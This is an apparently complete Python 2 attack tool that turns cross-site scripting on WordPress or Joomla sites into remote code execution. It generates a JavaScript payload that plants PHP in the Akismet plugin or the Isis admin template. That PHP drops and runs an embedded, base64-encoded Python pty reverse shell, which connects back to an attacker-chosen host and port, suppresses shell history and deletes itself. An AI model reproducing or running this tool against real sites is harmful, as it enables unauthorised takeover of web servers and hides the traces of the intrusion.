#!/usr/bin/python2
# -*- coding: utf-8 -*-
#python pty shell provided by infodox
import subprocess, base64, sys, urllib
import argparse

rshell = """import os
import pty
import socket

lhost = "%s"
lport = %s

def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((lhost, lport))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    os.putenv("HISTFILE",'/dev/null')
    pty.spawn("/bin/bash")
    s.close()

if __name__ == "__main__":
    main()"""

print """
▐▄• ▄ .▄▄ · .▄▄ ·     ▪  ▪      .▄▄ ·  ▄ .▄▄▄▄ .▄▄▌  ▄▄▌  
 █▌█▌▪▐█ ▀. ▐█ ▀.     ██ ██     ▐█ ▀. ██▪▐█▀▄.▀·██•  ██•  
 ·██· ▄▀▀▀█▄▄▀▀▀█▄    ▐█·▐█·    ▄▀▀▀█▄██▀▐█▐▀▀▪▄██▪  ██▪  
▪▐█·█▌▐█▄▪▐█▐█▄▪▐█    ▐█▌▐█▌    ▐█▄▪▐███▌▐▀▐█▄▄▌▐█▌▐▌▐█▌▐▌
•▀▀ ▀▀ ▀▀▀▀  ▀▀▀▀     ▀▀▀▀▀▀     ▀▀▀▀ ▀▀▀ · ▀▀▀ .▀▀▀ .▀▀▀
"""

def preparepayload(payload, cms, targeturi):
	payload = urllib.quote_plus(payload)
	if cms == 'joomla':
		f = open('joomla.js').read()
		payload = f % (targeturi, payload, targeturi, targeturi, targeturi)
	else:
		f = open('wordpress.js').read()
		payload = f % (targeturi, targeturi, payload, targeturi, targeturi)
	open('out.js', 'w').write(payload)
	print('[+] out.js generated!')

def genpayload(lhost, payload, rshell, cms, targeturi):
	rshell = base64.b64encode(rshell % (lhost, lport))
	payload = '<?php file_put_contents("/tmp/rshell.py", base64_decode("%s")); system("python /tmp/rshell.py; rm /tmp/rshell.py"); ?>' % (rshell)
	preparepayload(payload, cms, targeturi)

parser = argparse.ArgumentParser()
parser.add_argument('-l', '--lhost', dest='lhost', help='Host for reverse shell (Ex. 8.8.8.8)', metavar='LHOST')
parser.add_argument('-p', '--lport', dest='lport', help='Port for reverse shell (Ex. 4444)', metavar='LPORT')
parser.add_argument('-u', '--targeturi', dest='targeturi', help='TargetURI (Ex. /wordpress)', metavar='TargetURI', default='')
parser.add_argument('-f', '--file', dest='custom', help='Custom payload (Ex. custom.php)', metavar='CustomPayload')
parser.add_argument('-c', '--cms', dest='cms', help='CMS (Ex. wordpress)', metavar='CMS')


try:
	args = parser.parse_args()
	if args.cms.lower() == 'wordpress':
		cms = args.cms.lower()
		print('[+] Payload Location: /wp-content/plugins/akismet/index.php')
	elif args.cms.lower() == 'joomla':
		cms = args.cms.lower()
		print('[+] Payload Location: /administrator/templates/isis/pay.php')
	if args.custom == None:
		print('[+] Using default payload: python pty reverse shell')
		lhost = args.lhost
		lport = args.lport
		genpayload(lhost, lport, rshell, cms, args.targeturi)
	else:
		print('[+] Using custom payload: %s' % (args.custom))
		payload = open(args.custom).read()
		preparepayload(payload, cms, args.targeturi)
except:
	parser.print_help()